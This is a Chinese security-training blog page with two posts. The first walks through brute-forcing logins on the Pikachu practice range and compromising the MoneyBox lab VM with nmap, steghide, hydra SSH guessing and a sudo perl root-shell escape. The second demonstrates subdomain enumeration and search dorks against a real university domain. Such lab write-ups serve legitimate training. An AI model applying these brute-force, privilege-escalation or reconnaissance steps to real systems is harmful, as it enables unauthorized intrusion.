  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/08/%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%8CBurp,Yakit%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%8C%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%8C%E6%94%BB%E7%A0%B4%E9%9D%B6%E6%9C%BAmoneybox/">基于表单的暴力破解，Burp,Yakit的使用，验证码绕过，攻破靶机moneybox</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><h3 id="Burp的使用"><a href="#Burp的使用" class="headerlink" title="Burp的使用"></a>Burp的使用</h3><p>1.从老师那下载pikachu-master（皮卡丘靶场）的压缩包，将其移到虚拟机win10的phpstudy（小皮）的根目录下并解压。在小皮中打开网站，点击皮卡丘。<br>2.进入第一关：基于表单的暴力破解。<br>3.启动Burp,打开内置浏览器，把第一关的网址复制到内置浏览器，在表单的用户框和密码框中分别填入admin   admin<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704626945256-ee3fcbf1-2e7c-4930-a136-66fd3477ed34.png" alt="image.png"><br>4.看Burp的HTTP历史记录,找到post请求的数据包，右键发送到Intruder。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704627071485-2892d12d-b551-4ce1-ac68-91fbbe96680f.png" alt="image.png"><br>5.在Intruder中，下图的1过程改成集束炸弹，再点击2过程的清除payload的位置，3过程选中横线处，添加payload位置。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704627300634-c9dfd703-aed2-4550-b548-05cbeba28e66.png" alt="image.png"><br>6.点击位置旁边的payload，按下图添加admin<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704627727908-8dce7490-f437-4d73-ba55-2f6186aa56f4.png" alt="image.png"><br>7.在payload集选择2，然后在手动添加已知的真实密码123456，从下图的的从列表中添加密码。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704627835525-74d11754-8dfb-473d-8687-d0431c91a9f9.png" alt="image.png"><br>8.点击右上角的开始攻击，结果如下，35077和其他的长度有很大不同，爆出密码123456<br>注意，已知真实密码123456爆破出密码123456，这个只是测试的过程。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704628126555-19ec4e49-a8bd-4f0f-899e-603bb12da8d4.png" alt="image.png"></p>
<h3 id="Yakit的使用"><a href="#Yakit的使用" class="headerlink" title="Yakit的使用"></a>Yakit的使用</h3><p>1.免配置启动，清空历史请求，打开内置浏览器，把皮卡丘的第一关的网址复制到内置浏览器，在表单中输入admin admin。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704628833595-7b55b094-43e2-40e2-88b8-4e8493f8be4c.png" alt="image.png"><br>2.看历史记录，抓到了post数据包，点击下图的的FUZZ<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704628942120-a0d8ab91-350d-4150-be30-80d81df0bfc7.png" alt="image.png"><br>3.点击首页–&gt;点击首页里的payload–&gt;查看字典    （注意：可以在这里添加字典）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629688165-e532478c-e3e5-4a18-a78f-0f64eccce50e.png" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704629775975-8bdabc71-b361-49fb-b90d-50a8581c6f8b.png" alt="image.png"><br>4.返回web Fuzzer，删除两个admin，右键插入模糊测试字典，选择对应的字典。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704630259162-cbeee131-a85a-438b-b6c7-94bb79d42aa4.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704630165214-c9c15b80-8445-4409-b812-9db67a000c7a.png" alt="image.png"><br>5.点击发送请求，再点击响应大小，均发送成功，发现有一个响应大小34695，与其他不同，爆出密码为123456<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704630354041-e304e822-614c-44e1-bde0-88360a827f42.png" alt="image.png"></p>
<h2 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h2><h3 id="Yakit的使用-1"><a href="#Yakit的使用-1" class="headerlink" title="Yakit的使用"></a>Yakit的使用</h3><p>1.由自动放行改为手动劫持，把第二关的网址复制到内置浏览器，填入admin admin 以及验证码。抓到数据包，右击界面发送到Web Fuzzer<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704631333007-7cc6262c-b222-4865-a0e6-1b9610f8184d.png" alt="image.png"></p>
<p>2.与之前的操作一样插入字典，发送请求，最后点自动放行。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704632752625-692a4d82-5162-4243-bd7c-450b1579be6f.png" alt="image.png"></p>
<h2 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h2><p>1.键入F12–&gt;点击三个点–&gt;设置–&gt;勾选 禁用js<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704633205359-f6c83d52-9474-47d4-b9b5-41b14192b0de.png#averageHue=%23fcfbfb&clientId=u4b7a7849-6dd3-4&from=paste&height=364&id=ub9fb3463&originHeight=364&originWidth=1700&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40537&status=done&style=none&taskId=ufcc1e3da-7565-4868-8684-a288066a0e3&title=&width=1700" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704633336800-3944031f-194a-4dc5-b45e-9d50fdab9f85.png" alt="image.png"><br>2.后面的步骤和第二关验证码绕过（on server）一样了，不再赘述。</p>
<h2 id="攻破靶机的环境搭建"><a href="#攻破靶机的环境搭建" class="headerlink" title="攻破靶机的环境搭建"></a>攻破靶机的环境搭建</h2><h3 id="靶机moneybox安装和设置"><a href="#靶机moneybox安装和设置" class="headerlink" title="靶机moneybox安装和设置"></a>靶机moneybox安装和设置</h3><p>1.下载并安装Oracle VM VirtualBox，链接：<a target="_blank" rel="noopener" href="https://www.virtualbox.org/">https://www.virtualbox.org/</a><br>   下载moneybox.ova镜像，链接：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/moneybox/MoneyBox.ova">https://download.vulnhub.com/moneybox/MoneyBox.ova</a><br>2.打开virtualBox,依次点击管理–&gt;导入虚拟电脑–&gt;找到moneybox.ova的安装路径，导入。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704374982933-9cfce813-baf2-484a-b355-01b4a77b2b5f.png" alt="image.png"><br>3.右击红色图标的靶机，网络–&gt;选择仅主机–&gt;选择virtualBox Host-Only Ethernet Adapter–&gt;点击OK。<br>–&gt;高级–&gt;查看靶机物理地址，并记住FF86<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704378038700-4882e0ae-09ed-4172-bfa2-05b9a8e55081.png" alt="image.png"><br>4.USB设备–&gt;选择USB1.1–&gt;点击OK<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704375648197-da29111d-75e3-4d05-a78b-a1e7350ab764.png" alt="image.png"><br>5.双击红色图标的靶机，启动。启动成功截图如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704375831136-e0b03de3-658b-4cb8-b471-00a2b566252b.png" alt="image.png"></p>
<h3 id="kali机设置"><a href="#kali机设置" class="headerlink" title="kali机设置"></a>kali机设置</h3><p>1.右击kali机，设置–&gt;添加网络适配器2–&gt;网络适配器设置为桥接，网络适配器2设置为NAT–&gt;点击确定<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704376209469-7b6febd3-9650-433e-961a-f10a05fdc9fb.png" alt="image.png"><br>2.打开kali机，在命令窗口输入ifconfig，可查找到网卡eth0和eth1的ip地址。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704376646650-f28935d3-576c-44f5-9d32-52dc8f2db351.png" alt="image.png"><br>3.依次输入下面的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  ifdown eth0                                 //关闭接口</span><br><span class="line">ifup eth0                                    //重启接口</span><br><span class="line">arp-scan -l -I eth0                         //在指定的网络接口 eth0 上执行ARP扫描。ARP扫描用于通过发送ARP请求并收集响应来发现本地网络上的设备</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704377264016-328b4a66-7044-4d9d-b051-d83378f4f87e.png" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704377313332-283ba7bd-d8e9-493a-81e3-47eace781b89.png" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704378131929-ecd240e8-a2bc-4b3f-901b-3b28b184f303.png" alt="image.png"><br>得知靶机的ip地址为192.168.56.101</p>
<h2 id="攻破靶机moneybox"><a href="#攻破靶机moneybox" class="headerlink" title="攻破靶机moneybox"></a>攻破靶机moneybox</h2><h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><p>1.输入命令<code>nmap -p- 192.168.56.101  </code><br>结果如下：  扫到21,22,80端口开放<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704378294299-d5c19da0-f8ba-451c-be4f-3dac7d8ddeed.png" alt="image.png"><br>2.向21,22,80端口发送请求，查看21,22,23端口状态<br>命令<code>nmap -p 21,22,80 -sC 192.168.56.101</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704378568681-c43fb703-5633-4ebc-a5d0-c32999a589b2.png" alt="image.png"></p>
<h3 id="FTP协议的利用"><a href="#FTP协议的利用" class="headerlink" title="FTP协议的利用"></a>FTP协议的利用</h3><p>命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.101                                //ftp连接到192.168.56.101</span><br><span class="line">ls                                                //查看内容</span><br><span class="line">help                                              //查看帮助命令</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704378815874-4fe6d18d-c45e-4be5-8a89-b84d8abd3ce6.png" alt="image.png"></p>
<h3 id="获取trytofind-jpg"><a href="#获取trytofind-jpg" class="headerlink" title="获取trytofind.jpg"></a>获取trytofind.jpg</h3><p>1.命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get trytofind.jpg                                //获取图片</span><br><span class="line">ftp&gt; exit                                            //退出ftp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704379758742-4ae4cb37-a593-4777-abb1-675b92434049.png" alt="image.png"><br>2.查看图片，没发现任何信息<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704380021520-c25c2745-df4f-4604-8e81-f2d5b1fe8463.png" alt="image.png"><br>3.看看二进制文件<br><code>strings trytofind.jpg</code><br>使用以上的命令查看.jpg .exe  .txt等文件，电脑都是以二进制的文件呈现的，而二进制是泛指的，不是指具体的0,1。二进制转化为十六进制字符，看字符比较容易理解。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704380742628-409100ff-f286-4076-887b-0728edf27755.png" alt="image.png"><br>一般图片不会有红色箭头指的一行括号，可能图片藏东西了。</p>
<h3 id="获取隐藏文件"><a href="#获取隐藏文件" class="headerlink" title="获取隐藏文件"></a>获取隐藏文件</h3><p>1.安装steghide   <code>apt install steghide</code></p>
<ol start="2">
<li>查看隐藏文件  <code>steghide info trytofind.jpg</code>    发现确实有隐藏文件，但缺少一个密钥</li>
</ol>
<h3 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h3><p>1.命令：<code>dirsearch -u 192.168.56.101 -x 403</code>   结果扫到一个目录blogs，然后去访问<a target="_blank" rel="noopener" href="http://192.168.56.101/blogs/">http://192.168.56.101/blogs/</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704381623318-f8790253-ef91-4201-8d82-8fd2151f5845.png" alt="image.png"><br>2.右键检查网页，寻找信息。在查看器的最后一行，发现了另一个目录S3cr3t-T3xt<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704381911973-2e22647d-74a7-4efa-bb88-ceb97ba0a7c6.png" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704382144208-99115ec2-8747-4b2e-a3d2-92e9feea80f4.png" alt="image.png"><br>3.访问<a target="_blank" rel="noopener" href="http://192.168.56.101/">http://192.168.56.101/</a>S3cr3t-T3xt     同样的操作，发现了密钥key 3xtr4ctd4t4<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704382644575-9d9290b2-00cc-490c-aaba-cf48cfb35a18.png" alt="image.png"><br>4.命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide  extract -sf trytofind.jpg                //提取隐藏文件</span><br><span class="line">cat data.txt                                       //看隐藏文件data.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704382748624-f051e598-0291-4b24-810a-6c6d2390370c.png" alt="image.png"><br>5.data.txt中的内容为  你好。。。雷诺<br>    我告诉你一些重要的事，你的密码太弱了，请更改您的密码不要低估它。。。。。。。</p>
<h3 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h3><p>6.说明renu密码是弱密码，开始用hydra爆破他的密码，命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hydra -h</span><br><span class="line">cd Desktop  </span><br><span class="line">hydra -l renu -P ./1 ssh://192.168.56.101                  //  1是桌面新建的文件，文件里是自建的密码字典</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704383732564-15a5637c-10cb-4153-8c01-26e2647d8f85.png" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704383770933-01ebf4ac-a701-47b7-aa31-ac805de124c7.png" alt="image.png"><br>爆出用户名：renu       密码：987654321</p>
<h3 id="获取第一个flag"><a href="#获取第一个flag" class="headerlink" title="获取第一个flag"></a>获取第一个flag</h3><p>1.ssh登录     <code>ssh renu@192.168.0.129</code><br>  ls     查看文件<br> cat   user1.txt    查看user1.txt<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704384273472-943465b7-2cdd-47b0-9133-394b642110f2.png" alt="image.png"></p>
<h3 id="获取第二个flag"><a href="#获取第二个flag" class="headerlink" title="获取第二个flag"></a>获取第二个flag</h3><p>1.查看renu用户的输入命令历史记录<br><code>cat .bash_history</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704434828136-22510d78-ff7f-412d-a6bd-cf46d86e95f7.png" alt="image.png"></p>
<p>2.发现renu远程登录了用户lily的电脑。所以我们尝试去登录lily用户<br><code>ssh lily@192.168.56.101</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704435074467-d0154aa6-339a-4a48-8b50-f0746a1eaed7.png" alt="image.png"><br>登录成功！<br>3.输入以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">cat user2.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704435586700-ab82fefa-4bb8-45c2-a279-f86692b44a83.png" alt="image.png"></p>
<h3 id="获取第三个flag"><a href="#获取第三个flag" class="headerlink" title="获取第三个flag"></a>获取第三个flag</h3><p>1.命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo -l                                      //显示当前用户可以执行的命令列表</span><br><span class="line">sudo perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br><span class="line">id                                          //显示用户id,组id</span><br><span class="line"># cd /root</span><br><span class="line"># ls -al</span><br><span class="line"># cat .root.txt</span><br></pre></td></tr></table></figure>

<p>第二个命令需要去GTFOBins 网站（GTFOBins 是一个开源项目，旨在为渗透测试人员和安全研究人员提供一个易于使用的工具）寻找<br>（1）在该网站的搜索框搜索perl（perl是脚本语言）点击第2个箭头的perl，找到sudo<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704436575644-e9fca066-b3ed-403c-adbf-7f11c0131c9d.png" alt="image.png"><br>（2）复制sudo下面的命令，粘贴到kali<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704439185033-a4cf177c-1e3a-4b37-b0aa-c82d8128e01c.png" alt="image.png">      </p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-域名，子域名获取，百度和谷歌搜索语法" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/01/08/%E5%9F%9F%E5%90%8D%EF%BC%8C%E5%AD%90%E5%9F%9F%E5%90%8D%E8%8E%B7%E5%8F%96%EF%BC%8C%E7%99%BE%E5%BA%A6%E5%92%8C%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95/" class="article-date">
      <time datetime="2024-01-08T01:05:42.000Z" itemprop="datePublished">2024-01-08</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/08/%E5%9F%9F%E5%90%8D%EF%BC%8C%E5%AD%90%E5%9F%9F%E5%90%8D%E8%8E%B7%E5%8F%96%EF%BC%8C%E7%99%BE%E5%BA%A6%E5%92%8C%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95/">域名，子域名获取，百度和谷歌搜索语法</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p>又称网域，是由一串用点分隔的名字组成的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BA%92%E8%81%94%E7%BD%91/199186?fromModule=lemma_inlink">互联网</a>上某一台<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA/140338?fromModule=lemma_inlink">计算机</a>或计算机组的名称，用于在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93/2987565?fromModule=lemma_inlink">数据传输</a>时对计算机的定位标识。</p>
<h3 id="法律"><a href="#法律" class="headerlink" title="法律"></a>法律</h3><p>1.国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。<br>任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉 和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宜扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p>
<p>2.[非法侵入计算机信息系统罪]违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。</p>
<p>[非法获取计算机信息系统数据、非法控制计算机信息系统罪]违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金;情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。</p>
<p>[提供侵入、非法控制计算机信息系统程序、工具罪]提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款的规定处罚。</p>
<p>单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照各该款的规定处罚。</p>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul>
<li>一级域名</li>
</ul>
<p> 一级域名是域名体系中最右边的部分，它通常代表了一个域名的类别或国家。比如在      baidu.com 中，.com 就是顶级域名</p>
<ul>
<li>二级域名（根域）</li>
</ul>
<p>二级域名位于顶级域名之前，它通常代表了一个组织或机构。在 baidu.com 中，baidu 就是二级域名，表示具体的商业实体。</p>
<ul>
<li>三级域名</li>
</ul>
<p> 三级域名位于二级域名之前，用于进一步细分组织内的不同部门或服务。例如，在 baidu.com 中，可以有 news.baidu.com，这里的 news 就是三级域名，表示百度公司下的新闻部门。<br>子域名<br>子域名是三级域名的一个特例，它通常用于指定主机的角色或服务类型，比如 www、mail、ftp 等。在 baidu.com 中，<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> 中的 www 就是子域名<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704204457366-9ad2648a-0b7a-4a94-a2d8-53f01a428c96.png" alt="Image.png"></p>
<h2 id="子域名获取"><a href="#子域名获取" class="headerlink" title="子域名获取"></a>子域名获取</h2><h3 id="域名挖掘网站"><a href="#域名挖掘网站" class="headerlink" title="域名挖掘网站"></a>域名挖掘网站</h3><p>1.子域名爆破网站链接：<a target="_blank" rel="noopener" href="http://z.zcjun.com/">http://z.zcjun.com/</a><br>2.使用：以湖南信息学院  hnuit.edu.cn   为例，将这个网址填入下图框内，点击提交。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704205194309-c2eb7227-1d41-49ae-b553-58f976389b7e.png" alt="image.png"><br>复制爆出来的任一子域名，并在浏览器访问。结果如下，如果访问的每一个子域名都跳到同一页面，说明遇到泛解析了。注意：泛解析的作用是防爆破。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704205379859-a14fe73f-cd27-4174-97a2-b151ffd3c78d.png" alt="image.png">3. FOFA 搜索引擎      链接 <a target="_blank" rel="noopener" href="https://fofa.info/toLogin">https://fofa.info/toLogin</a><br>首先注册登录，查询湖南信息学院hnuit.edu.cn    结果如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704207297849-f99cc025-45c4-48db-8956-cf1a37215444.png" alt="image.png"><br>4.360网路空间测绘  <a target="_blank" rel="noopener" href="https://quake.360.net/quake/#/index">https://quake.360.net/quake/#/index</a><br>注册登录，查询湖南信息学院hnuit.edu.cn    结果如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704207604155-3ca089a1-4e13-4024-b3a6-ad5952f51034.png" alt="image.png"></p>
<ol start="5">
<li>奇安信        <a target="_blank" rel="noopener" href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a><br>注册登录，查询湖南信息学院hnuit.edu.cn    结果如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704207986119-0ec49a18-38c7-4b5c-b5ab-009cf77653f2.png" alt="image.png"></li>
</ol>
<h3 id="域名挖掘工具"><a href="#域名挖掘工具" class="headerlink" title="域名挖掘工具"></a>域名挖掘工具</h3><p>Layer子域名挖掘机4.2纪念版  提取链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1VQ2HLocs39B72ElysskPog">https://pan.baidu.com/s/1VQ2HLocs39B72ElysskPog</a>     提取码：121I<br>下图的1框中填入baidu.com,线程最好改成50或100，如果线程全速，路由器可能会瘫痪。最后点击启动，稍等一会，出现百度的子域名。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704279912613-8e1627a0-d695-4158-a55a-55c6ab3cd154.png" alt="image.png"></p>
<h2 id="百度和谷歌搜索语法"><a href="#百度和谷歌搜索语法" class="headerlink" title="百度和谷歌搜索语法"></a>百度和谷歌搜索语法</h2><h3 id="百度语法"><a href="#百度语法" class="headerlink" title="百度语法"></a>百度语法</h3><p>1.在浏览器安装屏蔽广告插件<br>2.seo的含义：汉译为搜索引擎优化。是一种方式：利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。目的是让其在行业内占据领先地位，获得品牌收益。<br>3.语法<br>（1）增加相关资料，下图是增加知乎的内容<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704284517963-76bd31b5-9263-4323-8b0d-9d6c18291dbf.png" alt="image.png"><br>（2）减少相关内容，下图是减少CSDN的内容<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704284711776-b307af45-a554-49e3-bdf0-b238dc6556bd.png" alt="image.png"></p>
<h3 id="谷歌语法"><a href="#谷歌语法" class="headerlink" title="谷歌语法"></a>谷歌语法</h3><p>1.“”英文双引号中的内容作为一个整体被搜索; 精确匹配搜索<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704285327533-f001791c-e778-49a1-a8b1-74a6465b1b57.png" alt="image.png"></p>
<ol start="2">
<li>mac*    搜索出mac有关的所有字符<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704285546055-4e9d4803-23c8-4333-a7ae-d5ca9d80f262.png" alt="image.png"></li>
<li>“tencent.com” 马化腾 filetype:pdf<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704287069233-5dddc8e7-0179-4ec8-aa37-4b049a36edd5.png" alt="image.png"><ol start="4">
<li><pre><code>  inurl:	把搜索范围限定在url链接中       &quot;hnuit.edu.cn&quot; inurl:id
   ![image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704287110703-ca77c953-765d-4f1f-8ad4-cb0b5558d862.png)
  5.Index  of	可以帮助你寻找网络和FTP目录          index  of mp3
  ![image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704287288409-a273dfde-07e4-4279-b989-093690af8309.png)
  6.详细谷歌语法
</code></pre>
</li>
</ol>
</li>
</ol>
<table>
<thead>
<tr>
<th><strong>算  符</strong></th>
<th><strong>含    义</strong></th>
<th><strong>应用举例</strong></th>
</tr>
</thead>
<tbody><tr>
<td>AND&#x2F;空格</td>
<td>所连接的关键词之间是“与”的关系;</td>
<td>云计算 分布式计算</td>
</tr>
<tr>
<td>OR&#x2F;&#124;</td>
<td>所连接的关键词之间是“或”的关系</td>
<td>图片 &#124; 写真</td>
</tr>
<tr>
<td>-</td>
<td>所连接的关键词之间是“非”的关系</td>
<td>神雕侠侣 -游戏</td>
</tr>
<tr>
<td>（）</td>
<td>在检索式中括号里的运算将优先进行</td>
<td>电子商务 AND  (云计算 -分布式计算)</td>
</tr>
<tr>
<td>“”</td>
<td>“”英文双引号中的内容作为一个整体被搜索; 精确匹配搜索</td>
<td>“智能天线”</td>
</tr>
<tr>
<td>*</td>
<td>通配符-星号*，代表完整的字词; A * B、A * * B这两个是有区别的</td>
<td>Flower  * pots &#x2F;Flower * * pots</td>
</tr>
<tr>
<td>+</td>
<td>强制搜索一般会被自动忽略的搜索关键词，如：who、the、of、am</td>
<td>+B</td>
</tr>
<tr>
<td>~</td>
<td>同义符;在搜索词前使用，表示会和同时搜索相近词义的词;示例中会同搜元素Si</td>
<td>~  silicon</td>
</tr>
<tr>
<td>..</td>
<td>搜索数字范围限定</td>
<td>手机价格2000..5000</td>
</tr>
<tr>
<td>filetype:</td>
<td>把搜索范围限定在特定文件类型中; .pdf&#x2F;.doc&#x2F;.docx&#x2F;.ppt&#x2F;.pptx&#x2F;.xls&#x2F;.xlsx&#x2F;.rtf&#x2F;.txt&#x2F;.swf&#x2F;.ps</td>
<td>霍金 黑洞filetype:pdf</td>
</tr>
<tr>
<td>site：</td>
<td>把搜索范围限定在特定站点、某一站点特定频道、特定域名后缀中</td>
<td>科技 site:news.163.com</td>
</tr>
<tr>
<td>inurl:</td>
<td>把搜索范围限定在url链接中</td>
<td>inurl:jiqiao  photoshop</td>
</tr>
<tr>
<td>allinurl:</td>
<td>把搜索范围限定在url链接中, 只不过其后所有关键词均要在url链接中出现</td>
<td>allinurl:jiqiao  photoshop</td>
</tr>
<tr>
<td>intitle</td>
<td>把搜索范围限定在网页标题中</td>
<td>商业 intitle:超级女声</td>
</tr>
<tr>
<td>allintitle:</td>
<td>把搜索范围限定在网页标题中; 只不过其后所有关键词均要在网页标题中出现</td>
<td>allintitle:超级女声 张靓颖</td>
</tr>
<tr>
<td>intext:</td>
<td>把搜索范围限定在网页正文中; 忽略超链接文本、URL以及题目等</td>
<td></td>
</tr>
</tbody></table>
